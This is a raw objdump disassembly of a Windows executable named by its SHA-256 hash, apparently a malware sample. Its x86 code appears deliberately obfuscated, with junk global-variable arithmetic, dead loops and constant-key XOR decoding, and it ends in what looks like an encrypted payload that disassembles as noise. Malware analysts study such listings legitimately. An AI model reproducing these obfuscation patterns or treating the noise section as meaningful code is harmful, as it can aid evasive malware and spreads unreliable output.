
ebc7ffa06824b862d0224a8ad6813291554f7cf50751049d70a1ef62e81c6d09.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xa4
  401009:	mov    ecx,DWORD PTR [ebp+0x8]
  40100c:	and    DWORD PTR ds:0x42f010,0x0
  401016:	jmp    0x401026
  40101b:	mov    eax,ds:0x42f010
  401020:	inc    eax
  401021:	mov    ds:0x42f010,eax
  401026:	cmp    DWORD PTR ds:0x42f010,0x1f
  40102d:	jae    0x401080
  401033:	cmp    DWORD PTR ds:0x42f010,0x7
  40103a:	jne    0x40105d
  401040:	push   0x36e0
  401045:	push   0x6272
  40104a:	push   0x42f00c
  40104f:	push   0x428f
  401054:	push   DWORD PTR [ebp-0xc]
  401057:	call   DWORD PTR ds:0x42b000
  40105d:	cmp    DWORD PTR ds:0x42f010,0x6
  401064:	jne    0x401075
  40106a:	mov    eax,ds:0x42f010
  40106f:	inc    eax
  401070:	mov    ds:0x42f010,eax
  401075:	jmp    0x40101b
  40107a:	or     DWORD PTR ds:0x431010,edx
  401080:	mov    eax,0x8a85
  401085:	or     DWORD PTR ds:0x431008,0x43001c
  40108f:	xor    ax,WORD PTR [ecx+0x20]
  401093:	and    DWORD PTR ds:0x433008,0x0
  40109d:	jmp    0x4010af
  4010a2:	mov    ecx,DWORD PTR ds:0x433008
  4010a8:	inc    ecx
  4010a9:	mov    DWORD PTR ds:0x433008,ecx
  4010af:	cmp    DWORD PTR ds:0x433008,0x1d
  4010b6:	jae    0x4010f5
  4010bc:	cmp    DWORD PTR ds:0x433008,0xc
  4010c3:	jne    0x4010d4
  4010c9:	push   0x803a
  4010ce:	call   DWORD PTR ds:0x42b048
  4010d4:	cmp    DWORD PTR ds:0x433008,0xb
  4010db:	jne    0x4010f0
  4010e1:	xor    ecx,ecx
  4010e3:	xor    ecx,DWORD PTR ds:0x433008
  4010e9:	inc    ecx
  4010ea:	mov    DWORD PTR ds:0x433008,ecx
  4010f0:	jmp    0x4010a2
  4010f5:	mov    ecx,0x3b4b
  4010fa:	inc    DWORD PTR ds:0x431010
  401100:	add    ax,cx
  401103:	movzx  eax,ax
  401106:	adc    ecx,DWORD PTR ds:0x432010
  40110c:	mov    DWORD PTR [ebp-0x18],eax
  40110f:	mov    ecx,DWORD PTR ds:0x41e0ac
  401115:	mov    ecx,DWORD PTR [ecx]
  401117:	sub    DWORD PTR ds:0x433014,ecx
  40111d:	mov    BYTE PTR [ebp-0x1],0x61
  401121:	and    DWORD PTR ds:0x432008,ebx
  401127:	lea    eax,[ebp-0x1]
  40112a:	sbb    ecx,0x3fcf
  401130:	mov    DWORD PTR [ebp-0x10],eax
  401133:	xor    ecx,ecx
  401135:	xor    ecx,DWORD PTR ds:0x42f024
  40113b:	adc    ecx,DWORD PTR ds:0x431004
  401141:	mov    DWORD PTR ds:0x42f024,ecx
  401147:	mov    al,BYTE PTR [ebp-0x1]
  40114a:	mov    ecx,DWORD PTR ds:0x43301c
  401150:	sub    DWORD PTR ds:0x42f00c,ecx
  401156:	mov    ecx,DWORD PTR [ebp-0x10]
  401159:	xor    al,0x6f
  40115b:	xor    DWORD PTR ds:0x431004,0x42f00c
  401165:	sub    al,0xd
  401167:	mov    BYTE PTR [ecx],al
  401169:	adc    DWORD PTR ds:0x433008,0x362f
  401173:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  40117a:	mov    DWORD PTR ds:0x42f020,0x1b
  401184:	cmp    DWORD PTR ds:0x42f020,0x0
  40118b:	je     0x4011bb
  401191:	cmp    DWORD PTR ds:0x42f020,0x24
  401198:	jne    0x4011a7
  40119e:	push   DWORD PTR [ebp-0x1c]
  4011a1:	call   DWORD PTR ds:0x42b004
  4011a7:	mov    ecx,DWORD PTR ds:0x42f020
  4011ad:	dec    ecx
  4011ae:	mov    DWORD PTR ds:0x42f020,ecx
  4011b4:	jmp    0x401184
  4011b9:	sub    ecx,eax
  4011bb:	push   ebx
  4011bc:	and    DWORD PTR ds:0x42f01c,ebx
  4011c2:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4011c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4011cc:	push   esi
  4011cd:	mov    eax,0x7510893
  4011d2:	or     esi,DWORD PTR ds:0x42f00c
  4011d8:	xor    ecx,eax
  4011da:	and    DWORD PTR ds:0x42f024,0x1a45
  4011e4:	mov    esi,0x3272db
  4011e9:	sub    DWORD PTR ds:0x432018,0x2ac6
  4011f3:	push   edi
  4011f4:	and    DWORD PTR ds:0x430014,0x5a76
  4011fe:	add    ecx,esi
  401200:	jmp    0x401210
  401205:	mov    dl,BYTE PTR [ebp-0x1]
  401208:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40120f:	inc    ecx
  401210:	mov    DWORD PTR ds:0x431010,0x6b59
  40121a:	cmp    ecx,0x40
  40121d:	mov    DWORD PTR ds:0x42f020,0x57b3
  401227:	jb     0x401205
  40122d:	mov    edx,DWORD PTR [ebp-0x14]
  401230:	xor    edx,eax
  401232:	add    edx,esi
  401234:	mov    DWORD PTR ds:0x42f010,0x7b99
  40123e:	jmp    0x4012e7
  401243:	adc    ecx,DWORD PTR ds:0x431014
  401249:	mov    edi,DWORD PTR [ebp+0x8]
  40124c:	sbb    DWORD PTR ds:0x430014,ebx
  401252:	mov    ecx,0x8a85
  401257:	sub    DWORD PTR ds:0x42f014,0x206e
  401261:	xor    cx,WORD PTR [edi+edx*4+0x2]
  401266:	xor    edi,0x3e7b
  40126c:	mov    edi,0x3b4b
  401271:	and    DWORD PTR ds:0x42f000,0x431018
  40127b:	add    cx,di
  40127e:	add    DWORD PTR ds:0x43301c,0x433008
  401288:	movzx  ecx,cx
  40128b:	sbb    DWORD PTR ds:0x432004,0x754
  401295:	mov    DWORD PTR [ebp-0x10],ecx
  401298:	sub    DWORD PTR ds:0x43200c,0x1052
  4012a2:	mov    ecx,DWORD PTR [ebp+0x8]
  4012a5:	xor    DWORD PTR ds:0x430018,0x431004
  4012af:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012b3:	or     DWORD PTR ds:0x433018,0x4238
  4012bd:	xor    ecx,0x8a85
  4012c3:	sbb    DWORD PTR ds:0x430014,0x4641
  4012cd:	add    ecx,edi
  4012cf:	mov    DWORD PTR ds:0x432018,ecx
  4012d5:	mov    edi,DWORD PTR [ebp-0x10]
  4012d8:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  4012df:	movzx  ecx,BYTE PTR ds:0x42f000
  4012e6:	inc    edx
  4012e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4012ea:	mov    DWORD PTR ds:0x432014,0x5338
  4012f4:	cmp    edx,ecx
  4012f6:	mov    DWORD PTR ds:0x42f020,0x6df9
  401300:	jne    0x401243
  401306:	mov    ecx,DWORD PTR [ebp-0x14]
  401309:	mov    DWORD PTR ds:0x42f010,0x1f
  401313:	cmp    DWORD PTR ds:0x42f010,0x0
  40131a:	je     0x401367
  401320:	cmp    DWORD PTR ds:0x42f010,0x25
  401327:	jne    0x40134b
  40132d:	push   0x42463b
  401332:	push   0x8a20
  401337:	push   DWORD PTR [ebp-0x10]
  40133a:	push   DWORD PTR [ebp-0x14]
  40133d:	push   0x4d55
  401342:	push   DWORD PTR [ebp-0x1c]
  401345:	call   DWORD PTR ds:0x42b04c
  40134b:	mov    edx,DWORD PTR ds:0x42f010
  401351:	dec    edx
  401352:	mov    DWORD PTR ds:0x42f010,edx
  401358:	jmp    0x401313
  40135d:	xor    DWORD PTR ds:0x432008,0x4304
  401367:	mov    edx,DWORD PTR [ebp+0x10]
  40136a:	add    DWORD PTR ds:0x42f008,0x431004
  401374:	xor    ecx,eax
  401376:	or     DWORD PTR ds:0x430014,0x43101c
  401380:	add    ecx,esi
  401382:	mov    DWORD PTR [edx],ecx
  401384:	sbb    DWORD PTR ds:0x433004,0x53ee
  40138e:	mov    ecx,DWORD PTR [ebp-0x14]
  401391:	xor    ecx,eax
  401393:	add    ecx,esi
  401395:	mov    DWORD PTR [ebp-0x20],ecx
  401398:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  40139f:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013a6:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4013b0:	mov    DWORD PTR [ebp+0x8],ecx
  4013b3:	mov    DWORD PTR ds:0x43201c,0x197a
  4013bd:	jmp    0x4015fd
  4013c2:	movzx  edx,BYTE PTR ds:0x430010
  4013c9:	sbb    DWORD PTR ds:0x43000c,edx
  4013cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4013d2:	xor    edx,edx
  4013d4:	xor    edx,DWORD PTR ds:0x430018
  4013da:	or     edx,DWORD PTR ds:0x42f00c
  4013e0:	mov    DWORD PTR ds:0x430018,edx
  4013e6:	mov    edx,DWORD PTR [ebp-0x8]
  4013e9:	xor    ecx,eax
  4013eb:	mov    DWORD PTR ds:0x431008,0x2495
  4013f5:	xor    edx,eax
  4013f7:	add    DWORD PTR ds:0x430010,0x397c
  401401:	sub    ecx,edx
  401403:	sub    DWORD PTR ds:0x42f020,0x386b
  40140d:	sub    ecx,esi
  40140f:	xor    edx,edx
  401411:	or     edx,DWORD PTR ds:0x432004
  401417:	sub    DWORD PTR ds:0x42f01c,edx
  40141d:	xor    ecx,eax
  40141f:	mov    DWORD PTR [ebp+0x8],ecx
  401422:	mov    ecx,DWORD PTR [ebp+0x8]
  401425:	mov    edx,DWORD PTR [ebp-0x64]
  401428:	lea    ecx,[edx+ecx*1+0x5708f5]
  40142f:	mov    DWORD PTR [ebp-0x64],ecx
  401432:	mov    DWORD PTR ds:0x432004,0x1f
  40143c:	cmp    DWORD PTR ds:0x432004,0x0
  401443:	je     0x40147a
  401449:	cmp    DWORD PTR ds:0x432004,0x29
  401450:	jne    0x401466
  401456:	push   0x4246b1
  40145b:	push   0x870a
  401460:	call   DWORD PTR ds:0x42b008
  401466:	mov    ecx,DWORD PTR ds:0x432004
  40146c:	dec    ecx
  40146d:	mov    DWORD PTR ds:0x432004,ecx
  401473:	jmp    0x40143c
  401478:	and    edx,ecx
  40147a:	mov    ecx,DWORD PTR [ebp+0x8]
  40147d:	or     edx,DWORD PTR ds:0x433014
  401483:	mov    edx,DWORD PTR [ebp-0x60]
  401486:	sbb    DWORD PTR ds:0x42f01c,0x5031
  401490:	lea    ecx,[edx+ecx*1+0x5708f5]
  401497:	inc    edx
  401498:	mov    DWORD PTR [ebp-0x60],ecx
  40149b:	mov    ecx,DWORD PTR [ebp+0x8]
  40149e:	mov    edx,DWORD PTR [ebp-0x5c]
  4014a1:	sub    DWORD PTR ds:0x433018,0x42f020
  4014ab:	lea    ecx,[edx+ecx*1+0x5708f4]
  4014b2:	and    DWORD PTR ds:0x433010,0x0
  4014bc:	mov    edx,DWORD PTR ds:0x433010
  4014c2:	inc    edx
  4014c3:	mov    DWORD PTR ds:0x433010,edx
  4014c9:	cmp    DWORD PTR ds:0x433010,0x1b
  4014d0:	jne    0x4014e1
  4014d6:	push   0x8182
  4014db:	call   DWORD PTR ds:0x42b014
  4014e1:	cmp    DWORD PTR ds:0x433010,0x11
  4014e8:	jb     0x4014bc
  4014ee:	mov    DWORD PTR [ebp-0x5c],ecx
  4014f1:	sbb    edx,0x6f22
  4014f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4014fa:	and    DWORD PTR ds:0x42f008,0x0
  401504:	mov    edx,DWORD PTR ds:0x42f008
  40150a:	inc    edx
  40150b:	mov    DWORD PTR ds:0x42f008,edx
  401511:	cmp    DWORD PTR ds:0x42f008,0x16
  401518:	jne    0x40152e
  40151e:	push   0x4246d1
  401523:	push   0x42460b
  401528:	call   DWORD PTR ds:0x42b050
  40152e:	cmp    DWORD PTR ds:0x42f008,0x14
  401535:	jb     0x401504
  40153b:	mov    edx,DWORD PTR [ebp-0x58]
  40153e:	xor    DWORD PTR ds:0x433008,0x43300c
  401548:	lea    ecx,[edx+ecx*1+0x5708fb]
  40154f:	and    DWORD PTR ds:0x43201c,0x0
  401559:	mov    edx,DWORD PTR ds:0x43201c
  40155f:	inc    edx
  401560:	mov    DWORD PTR ds:0x43201c,edx
  401566:	cmp    DWORD PTR ds:0x43201c,0x1f
  40156d:	jne    0x401583
  401573:	push   0x3426
  401578:	push   0x86d1
  40157d:	call   DWORD PTR ds:0x42b054
  401583:	cmp    DWORD PTR ds:0x43201c,0x17
  40158a:	jb     0x401559
  401590:	mov    DWORD PTR [ebp-0x58],ecx
  401593:	mov    ecx,DWORD PTR [ebp+0x8]
  401596:	mov    edx,DWORD PTR [ebp-0x54]
  401599:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015a0:	and    DWORD PTR ds:0x430010,0x0
  4015aa:	mov    edx,DWORD PTR ds:0x430010
  4015b0:	inc    edx
  4015b1:	mov    DWORD PTR ds:0x430010,edx
  4015b7:	cmp    DWORD PTR ds:0x430010,0x2b
  4015be:	jne    0x4015cd
  4015c4:	push   DWORD PTR [ebp-0x24]
  4015c7:	call   DWORD PTR ds:0x42b018
  4015cd:	cmp    DWORD PTR ds:0x430010,0x1e
  4015d4:	jb     0x4015aa
  4015da:	mov    DWORD PTR [ebp-0x54],ecx
  4015dd:	or     ecx,0x6900
  4015e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e6:	and    DWORD PTR ds:0x430000,0x2d7e
  4015f0:	mov    edx,DWORD PTR [ebp-0x50]
  4015f3:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015fa:	mov    DWORD PTR [ebp-0x50],ecx
  4015fd:	xor    ecx,0x7fc1
  401603:	mov    ecx,DWORD PTR [ebp+0x8]
  401606:	xor    ecx,eax
  401608:	add    ecx,esi
  40160a:	jne    0x4013c2
  401610:	mov    DWORD PTR ds:0x42f028,0xb4d
  40161a:	jmp    0x401891
  40161f:	and    DWORD PTR ds:0x42f024,0x0
  401629:	jmp    0x40163b
  40162e:	mov    edx,DWORD PTR ds:0x42f024
  401634:	inc    edx
  401635:	mov    DWORD PTR ds:0x42f024,edx
  40163b:	cmp    DWORD PTR ds:0x42f024,0x13
  401642:	jae    0x40168a
  401648:	cmp    DWORD PTR ds:0x42f024,0x4
  40164f:	jne    0x40166b
  401655:	push   0x84c6
  40165a:	push   DWORD PTR [ebp-0xc]
  40165d:	push   DWORD PTR [ebp-0x10]
  401660:	push   0x5448
  401665:	call   DWORD PTR ds:0x42b01c
  40166b:	cmp    DWORD PTR ds:0x42f024,0x3
  401672:	jne    0x401685
  401678:	mov    edx,DWORD PTR ds:0x42f024
  40167e:	inc    edx
  40167f:	mov    DWORD PTR ds:0x42f024,edx
  401685:	jmp    0x40162e
  40168a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40168d:	or     DWORD PTR ds:0x431010,0x1874
  401697:	mov    edx,DWORD PTR [ebp-0x8]
  40169a:	or     DWORD PTR ds:0x43300c,0x431008
  4016a4:	xor    ecx,eax
  4016a6:	add    DWORD PTR ds:0x42f028,0x431010
  4016b0:	xor    edx,eax
  4016b2:	sub    ecx,edx
  4016b4:	sub    ecx,esi
  4016b6:	xor    ecx,eax
  4016b8:	mov    DWORD PTR ds:0x430018,0x1f6a
  4016c2:	mov    DWORD PTR [ebp-0x1c],ecx
  4016c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4016c8:	mov    DWORD PTR [ebp+0x8],ecx
  4016cb:	jmp    0x4016fd
  4016d0:	mov    ecx,DWORD PTR [ebp+0x8]
  4016d3:	mov    edx,DWORD PTR [ebp-0x8]
  4016d6:	xor    ecx,eax
  4016d8:	xor    edx,eax
  4016da:	sub    ecx,edx
  4016dc:	sub    ecx,esi
  4016de:	xor    ecx,eax
  4016e0:	mov    DWORD PTR [ebp+0x8],ecx
  4016e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4016e6:	mov    edx,DWORD PTR [ebp+0x8]
  4016e9:	imul   edx,edx,0x5708f5
  4016ef:	xor    ecx,eax
  4016f1:	add    ecx,esi
  4016f3:	lea    ecx,[ebp+ecx*4-0x64]
  4016f7:	mov    edi,DWORD PTR [ecx]
  4016f9:	add    edx,edi
  4016fb:	mov    DWORD PTR [ecx],edx
  4016fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401700:	xor    ecx,eax
  401702:	add    ecx,esi
  401704:	jne    0x4016d0
  40170a:	mov    ecx,DWORD PTR [ebp-0x20]
  40170d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401714:	mov    dl,BYTE PTR [ebp-0x1]
  401717:	cmp    cl,dl
  401719:	je     0x4017f2
  40171f:	mov    ecx,DWORD PTR [ebp-0x20]
  401722:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401729:	mov    edx,DWORD PTR [ebp+0xc]
  40172c:	cmp    cl,BYTE PTR [edx]
  40172e:	jne    0x4018a3
  401734:	mov    ecx,DWORD PTR [ebp-0x14]
  401737:	mov    edx,DWORD PTR [ebp+0xc]
  40173a:	movsx  edx,BYTE PTR [edx]
  40173d:	xor    ecx,eax
  40173f:	add    ecx,esi
  401741:	cmp    edx,ecx
  401743:	mov    ecx,DWORD PTR [ebp-0xc]
  401746:	mov    DWORD PTR [ebp+0x8],ecx
  401749:	mov    ecx,DWORD PTR [ebp+0x8]
  40174c:	je     0x403ca2
  401752:	jmp    0x401787
  401757:	mov    ecx,DWORD PTR [ebp+0x8]
  40175a:	mov    edx,DWORD PTR [ebp-0x8]
  40175d:	xor    ecx,eax
  40175f:	xor    edx,eax
  401761:	sub    ecx,edx
  401763:	sub    ecx,esi
  401765:	xor    ecx,eax
  401767:	mov    DWORD PTR [ebp+0x8],ecx
  40176a:	mov    ecx,DWORD PTR [ebp+0x8]
  40176d:	mov    edx,DWORD PTR [ebp+0x8]
  401770:	xor    ecx,eax
  401772:	imul   edx,edx,0x5708f5
  401778:	add    ecx,esi
  40177a:	lea    ecx,[ebp+ecx*4-0x64]
  40177e:	mov    edi,DWORD PTR [ecx]
  401780:	add    edx,edi
  401782:	mov    DWORD PTR [ecx],edx
  401784:	mov    ecx,DWORD PTR [ebp+0x8]
  401787:	xor    ecx,eax
  401789:	add    ecx,esi
  40178b:	jne    0x401757
  401791:	mov    ecx,DWORD PTR [ebp-0x14]
  401794:	mov    edx,DWORD PTR [ebp+0x8]
  401797:	xor    ecx,eax
  401799:	xor    edx,eax
  40179b:	add    ecx,esi
  40179d:	add    edx,esi
  40179f:	cmp    ecx,edx
  4017a1:	jae    0x401837
  4017a7:	lea    edx,[ecx-0x3272db]
  4017ad:	mov    DWORD PTR [ebp-0x18],edx
  4017b0:	mov    edi,DWORD PTR [ebp-0x18]
  4017b3:	mov    DWORD PTR [ebp-0x24],0x705fd08
  4017ba:	lea    edx,[ebp-0x24]
  4017bd:	mov    DWORD PTR [ebp-0x10],edx
  4017c0:	mov    edx,DWORD PTR [ebp-0x10]
  4017c3:	add    DWORD PTR [edx],0x705fa08
  4017c9:	mov    ebx,DWORD PTR [ebp-0x10]
  4017cc:	xor    edi,eax
  4017ce:	add    edi,DWORD PTR [ebx]
  4017d0:	lea    edx,[ebp+ecx*4-0x64]
  4017d4:	mov    ebx,DWORD PTR [edx]
  4017d6:	xor    edi,ebx
  4017d8:	mov    DWORD PTR [edx],edi
  4017da:	mov    edx,DWORD PTR [ebp+0x8]
  4017dd:	xor    edx,eax
  4017df:	inc    ecx
  4017e0:	inc    DWORD PTR [ebp-0x18]
  4017e3:	add    edx,esi
  4017e5:	cmp    ecx,edx
  4017e7:	jb     0x4017b0
  4017ed:	jmp    0x401837
  4017f2:	mov    ecx,DWORD PTR [ebp-0xc]
  4017f5:	mov    DWORD PTR [ebp+0x8],ecx
  4017f8:	jmp    0x40182a
  4017fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401800:	mov    edx,DWORD PTR [ebp-0x8]
  401803:	xor    ecx,eax
  401805:	xor    edx,eax
  401807:	sub    ecx,edx
  401809:	sub    ecx,esi
  40180b:	xor    ecx,eax
  40180d:	mov    DWORD PTR [ebp+0x8],ecx
  401810:	mov    ecx,DWORD PTR [ebp+0x8]
  401813:	mov    edx,DWORD PTR [ebp+0x8]
  401816:	imul   edx,edx,0x5708f5
  40181c:	xor    ecx,eax
  40181e:	add    ecx,esi
  401820:	lea    ecx,[ebp+ecx*4-0x64]
  401824:	mov    edi,DWORD PTR [ecx]
  401826:	add    edx,edi
  401828:	mov    DWORD PTR [ecx],edx
  40182a:	mov    ecx,DWORD PTR [ebp+0x8]
  40182d:	xor    ecx,eax
  40182f:	add    ecx,esi
  401831:	jne    0x4017fd
  401837:	mov    ecx,DWORD PTR [ebp-0xc]
  40183a:	mov    DWORD PTR [ebp+0x8],ecx
  40183d:	jmp    0x40186f
  401842:	mov    ecx,DWORD PTR [ebp+0x8]
  401845:	mov    edx,DWORD PTR [ebp-0x8]
  401848:	xor    ecx,eax
  40184a:	xor    edx,eax
  40184c:	sub    ecx,edx
  40184e:	sub    ecx,esi
  401850:	xor    ecx,eax
  401852:	mov    DWORD PTR [ebp+0x8],ecx
  401855:	mov    ecx,DWORD PTR [ebp+0x8]
  401858:	mov    edx,DWORD PTR [ebp+0x8]
  40185b:	imul   edx,edx,0x5708f5
  401861:	xor    ecx,eax
  401863:	add    ecx,esi
  401865:	lea    ecx,[ebp+ecx*4-0x64]
  401869:	mov    edi,DWORD PTR [ecx]
  40186b:	add    edx,edi
  40186d:	mov    DWORD PTR [ecx],edx
  40186f:	mov    ecx,DWORD PTR [ebp+0x8]
  401872:	xor    ecx,eax
  401874:	add    ecx,esi
  401876:	jne    0x401842
  40187c:	mov    ecx,DWORD PTR [ebp-0x8]
  40187f:	mov    edx,DWORD PTR [ebp-0x20]
  401882:	xor    ecx,eax
  401884:	lea    ecx,[ecx+edx*1+0x3272db]
  40188b:	mov    DWORD PTR [ebp-0x20],ecx
  40188e:	inc    DWORD PTR [ebp+0xc]
  401891:	mov    ecx,DWORD PTR [ebp-0x1c]
  401894:	xor    ecx,eax
  401896:	add    ecx,esi
  401898:	jne    0x40161f
  40189e:	jmp    0x403cac
  4018a3:	mov    ecx,DWORD PTR [ebp-0xc]
  4018a6:	mov    DWORD PTR [ebp+0x8],ecx
  4018a9:	jmp    0x4018db
  4018ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4018b1:	mov    edx,DWORD PTR [ebp-0x8]
  4018b4:	xor    ecx,eax
  4018b6:	xor    edx,eax
  4018b8:	sub    ecx,edx
  4018ba:	sub    ecx,esi
  4018bc:	xor    ecx,eax
  4018be:	mov    DWORD PTR [ebp+0x8],ecx
  4018c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4018c4:	mov    edx,DWORD PTR [ebp+0x8]
  4018c7:	imul   edx,edx,0x5708f5
  4018cd:	xor    ecx,eax
  4018cf:	add    ecx,esi
  4018d1:	lea    ecx,[ebp+ecx*4-0x64]
  4018d5:	mov    edi,DWORD PTR [ecx]
  4018d7:	add    edx,edi
  4018d9:	mov    DWORD PTR [ecx],edx
  4018db:	mov    ecx,DWORD PTR [ebp+0x8]
  4018de:	xor    ecx,eax
  4018e0:	add    ecx,esi
  4018e2:	jne    0x4018ae
  4018e8:	jmp    0x403cb8
  4018ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4018f0:	mov    edx,DWORD PTR [ebp-0x8]
  4018f3:	xor    ecx,eax
  4018f5:	xor    edx,eax
  4018f7:	sub    ecx,edx
  4018f9:	sub    ecx,esi
  4018fb:	jmp    0x403c80
  401900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401901:	js     0x401926
  401903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401904:	mov    ds:0x673a7a3,eax
  401909:	je     0x401894
  40190b:	stos   DWORD PTR es:[edi],eax
  40190c:	iret   
  40190d:	add    esi,DWORD PTR [ebx+0x626262a5]
  401913:	bound  ebx,QWORD PTR [edx]
  401915:	pop    edi
  401916:	bound  esp,QWORD PTR [edx+0x9]
  401919:	xor    BYTE PTR [edi],al
  40191b:	cmp    eax,0xf033905
  401920:	jns    0x401948
  401922:	jne    0x40199a
  401924:	mov    ds:0x7172727d,al
  401929:	sub    bl,cl
  40192b:	sar    ch,0x4c
  40192e:	push   esp
  40192f:	jae    0x4019ae
  401931:	inc    ebx
  401932:	mov    WORD PTR [ecx+esi*2+0x45],?
  401936:	scas   eax,DWORD PTR es:[edi]
  401937:	inc    ecx
  401938:	push   edx
  401939:	cmp    al,0x90
  40193b:	loop   0x4018d4
  40193d:	inc    di
  40193f:	push   ecx
  401940:	jg     0x401969
  401942:	ins    BYTE PTR es:[edi],dx
  401943:	mov    dh,0x7f
  401945:	mov    esp,0xff3023ba
  40194a:	jbe    0x40190c
  40194c:	loop   0x401999
  40194e:	jg     0x40196e
  401950:	icebp  
  401951:	and    eax,0x97f1a2d1
  401956:	or     ebx,esi
  401958:	xchg   ebx,eax
  401959:	xor    eax,0x92b345ef
  40195e:	fsub   st,st(7)
  401960:	jno    0x401923
  401962:	sbb    al,cl
  401964:	out    dx,al
  401965:	loop   0x40199d
  401967:	add    al,0x54
  401969:	adc    BYTE PTR [esi],dh
  40196b:	jae    0x4019e1
  40196d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40196e:	(bad)  
  40196f:	or     ebx,DWORD PTR [ebp+0x19]
  401972:	mov    dh,0xff
  401974:	cmc    
  401975:	push   ebp
  401976:	xor    ebp,DWORD PTR [eax+0x2a]
  401979:	aam    0x43
  40197b:	in     eax,0x2
  40197d:	loop   0x4019e3
  40197f:	mov    ebp,0x5f84c17b
  401984:	xchg   ebx,eax
  401985:	mov    ebp,0x2d9a0817
  40198a:	jmp    0x40192a
  40198c:	and    BYTE PTR [edx+0x6b],ch
  40198f:	adc    eax,edx
  401991:	xor    DWORD PTR [edx-0x6f],ecx
  401994:	sub    BYTE PTR [ebx],ch
  401996:	dec    eax
  401997:	sti    
  401998:	scas   eax,DWORD PTR es:[edi]
  401999:	xchg   edx,eax
  40199a:	xor    eax,0xd0a7ac95
  40199f:	xchg   esp,eax
  4019a0:	dec    ebp
  4019a1:	clc    
  4019a2:	pop    ecx
  4019a3:	dec    edx
  4019a4:	push   eax
  4019a5:	adc    BYTE PTR [esi],bh
  4019a7:	jmp    0x4019cf
  4019a9:	sbb    esi,DWORD PTR [ecx+0x2cb7d253]
  4019af:	fcomp  QWORD PTR [eax]
  4019b1:	inc    esi
  4019b2:	loope  0x4019fe
  4019b4:	inc    esi
  4019b5:	mov    ecx,0xe4bf74e5
  4019ba:	pop    edx
  4019bb:	or     BYTE PTR [ebp+0x16],cl
  4019be:	xlat   BYTE PTR ds:[ebx]
  4019bf:	lea    eax,[eax]
  4019c1:	aad    0xa9
  4019c3:	dec    ebx
  4019c4:	or     DWORD PTR [ecx-0xd],ebp
  4019c7:	(bad)  
  4019c9:	mov    ds:0xbc72b523,eax
  4019ce:	xchg   ebp,eax
  4019cf:	mov    dl,0x50
  4019d1:	dec    ebx
  4019d2:	cmc    
  4019d3:	in     eax,dx
  4019d4:	or     DWORD PTR [ecx],edi
  4019d6:	mov    ebx,0x27001f6a
  4019db:	push   edi
  4019dc:	fwait
  4019dd:	push   ebx
  4019de:	jbe    0x401966
  4019e0:	sub    eax,0x80f40a4c
  4019e5:	fcom   QWORD PTR [ebx+0x28]
  4019e8:	pop    ds
  4019e9:	das    
  4019ea:	mov    ebp,0x6ed8676b
  4019ef:	cmp    DWORD PTR [ecx+edx*1+0x2314ce26],ebx
  4019f6:	inc    ecx
  4019f7:	add    al,0x79
  4019f9:	sub    al,0x87
  4019fb:	aam    0xda
  4019fd:	jns    0x4019d6
  4019ff:	lea    eax,[edi+0x73]
  401a02:	xchg   BYTE PTR [eax-0x38403fb7],dl
  401a08:	mov    ebp,0xc6e78dd
  401a0d:	fsubrp st(0),st
  401a0f:	jne    0x401a1f
  401a11:	shl    BYTE PTR [edi+eax*1+0x3e],cl
  401a15:	sbb    dl,ah
  401a17:	fs ret 0x2fcb
  401a1b:	ins    BYTE PTR es:[edi],dx
  401a1c:	lock xor bl,cl
  401a1f:	cmp    ecx,0x19c3c2f9
  401a25:	push   ds
  401a26:	mov    dh,0xb3
  401a28:	(bad)  
  401a29:	outs   dx,BYTE PTR ds:[esi]
  401a2a:	inc    esi
  401a2b:	mov    ebp,0x7af45a8d
  401a30:	jns    0x4019c5
  401a32:	loop   0x4019f7
  401a34:	add    al,0xa9
  401a36:	dec    eax
  401a37:	or     al,al
  401a39:	mov    ah,0x0
  401a3b:	adc    dh,BYTE PTR [ecx-0x47608aba]
  401a41:	mov    ah,0x24
  401a43:	and    al,0x88
  401a45:	test   al,0x6b
  401a47:	mov    ds:0x8d5ce5f,al
  401a4c:	lods   al,BYTE PTR ds:[esi]
  401a4d:	inc    ecx
  401a4e:	or     esi,DWORD PTR [esi+0x3f]
  401a51:	lock cwde 
  401a53:	cdq    
  401a54:	dec    ebp
  401a55:	jns    0x401a5f
  401a57:	cld    
  401a58:	fdivr  st,st(7)
  401a5a:	cdq    
  401a5b:	push   ebp
  401a5c:	aad    0x8f
  401a5e:	ds cbw 
  401a61:	dec    edi
  401a62:	and    dl,BYTE PTR [ebx+0x63300e63]
  401a68:	pop    esi
  401a69:	mov    ds:0xd017e8b4,eax
  401a6e:	mov    dl,0x59
  401a70:	retf   0x243b
  401a73:	mov    BYTE PTR [esi+0x13],bh
  401a76:	inc    ebx
  401a77:	mov    BYTE PTR [edi+0x404345da],al
  401a7d:	mov    BYTE PTR [ecx+0x2d53e49f],bl
  401a83:	jle    0x401afb
  401a85:	pop    ecx
  401a86:	and    ebp,DWORD PTR [ebx+edi*8-0x7b]
